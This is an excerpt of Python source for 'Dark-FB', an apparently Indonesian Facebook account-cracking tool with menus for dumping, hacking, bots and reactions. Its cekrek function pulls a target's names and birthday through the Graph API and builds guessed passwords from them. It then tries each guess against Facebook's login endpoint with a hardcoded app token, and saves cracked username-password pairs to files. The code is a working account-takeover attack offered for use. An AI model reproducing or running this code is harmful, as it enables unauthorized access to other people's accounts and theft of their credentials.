...
def login():
    try:
        ...
        print merah + '||    || ' + tutup + u' \x1b[7m Author: ZeDD Parker \x1b[0m'
...
def menu():
    ...
    print
    mana = raw_input(tutup + '[' + lime + 'ZeDD' + tutup + ']> ' + lime)
    if mana == '':
        exit(tutup + '[' + merah + '!' + tutup + '] Exit' + tutup)
    elif mana in ('1', '01'):
        informasi()
...
def dump():
    ...
    print
    mana_dump = raw_input(tutup + '[' + lime + 'ZeDD' + tutup + ']> ' + lime)
    if mana_dump == '':
        exit(tutup + '[' + merah + '!' + tutup + '] Exit' + tutup)
...
def hack():
    ...
    print tutup+"("+merah+"00"+tutup+") Back"
    print
    mana_hack = raw_input(tutup+"["+lime+"ZeDD"+tutup+"]> "+lime)
    if mana_hack =="":
            exit(tutup+"["+merah+"!"+tutup+"] Exit"+tutup)
...
def cekrek(puki):
    user = puki
    try:
            r = requests.get('https://graph.facebook.com/'+user+'/?access_token='+token)
            z = json.loads(r.text)
            lahir = z['birthday']
            day = lahir.replace('/', '')
            depan = z['first_name']
            belakang = z['last_name']
            password = [depan+'123',depan+'12345',belakang+'123',belakang+'12345',day,pw]
            for x in password:
                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(x)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                    get = json.load(data)
                    if 'access_token' in get:
                            print("\033[1;97m[\033[1;92mOK\033[1;97m] "+user+" | " +x)
                            auto_ok.append(user)
                            s = open('crack/auto_ok.txt','a')
                            s.write(user+"|"+x+"\n")
                            break
                    elif 'www.facebook.com' in get["error_msg"]:
                            print("\033[1;97m[\033[1;93mCP\033[1;97m] "+user+" | " +x)
                            auto_cp.append(user)
                            s = open('crack/auto_cek.txt','a')
                            s.write(user+"|"+x+"\n")
                            break
            auto_run.append(user)
            print(tutup+"\r["+blue+"*"+tutup+"] "+str(len(auto_run))+lime+"/"+tutup+str(len(auto_total))+" = "),;sys.stdout.flush()
    except: pass
...
def daftar():
    ...
    print tutup + 'WA.me : ' + lime + '+62 89620134992' + tutup
    print
...
def bot():
    ...
    print tutup + '(' + merah + '00' + tutup + ') Back'
    print
    mana_bot = raw_input(tutup + '[' + lime + 'ZeDD' + tutup + ']> ' + lime)
    if mana_bot == '':
        exit(tutup + '[' + merah + '!' + tutup + '] Exit' + tutup)
...
def react_target():
    ...
    print
    emot = raw_input(tutup+"["+lime+"ZeDD"+tutup+"]> "+lime)
    if emot in ['1','01']:
            tipe = "LIKE"
    elif emot in ['2','02']:
            tipe = "LOVE"
...
def guard():
    ...
    print
    ha = raw_input(tutup + '[' + lime + 'ZeDD' + tutup + ']> ' + lime)
    if ha == '':
        exit(tutup + '[' + merah + '!' + tutup + '] Exit' + tutup)
    elif ha in ('1', '01'):
        aktif = 'true'
...
def infotools():
    ...
    print merah + '              \\\\' + putih + '()' + merah + '//' + merah + '    \xe2\x95\x91\xe2\x95\x91' + tutup + '\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4\xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80' + merah + '\xe2\x95\xa0\xe2\x95\xa3 \xe2\x95\xa0\xe2\x95\xa9\xe2\x95\x97' + tutup
    print merah + '             //' + putih + '(__)' + merah + '\\\\' + merah + '  \xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d' + tutup + '\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\xb4 \xe2\x94\xb4   ' + merah + '\xe2\x95\x9a  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d' + kuning + 'v1.8' + tutup
    print merah + '             ||    || ' + tutup + u' \x1b[7m Author: ZeDD Parker \x1b[0m' + tutup
    print ''
    print kuning + '                 Coded' + tutup + ' : ' + at
    print kuning + '               Support' + tutup + ' : ./R41N53/LimiteD/Al2VyN'
    print kuning + '                Source' + tutup + ' : ' + lime + 'https://github.com/rezadkim'
    print kuning + '            Name Tools' + tutup + ' : Dark-FB'
    print kuning + '               Version' + tutup + ' : 1.8'
    print kuning + '              Language' + tutup + ' : English/Indonesian'
    print kuning + '          Date Release' + tutup + ' : 22/08/20019'
    print kuning + '               Contact' + tutup + ' : +6289620134992'
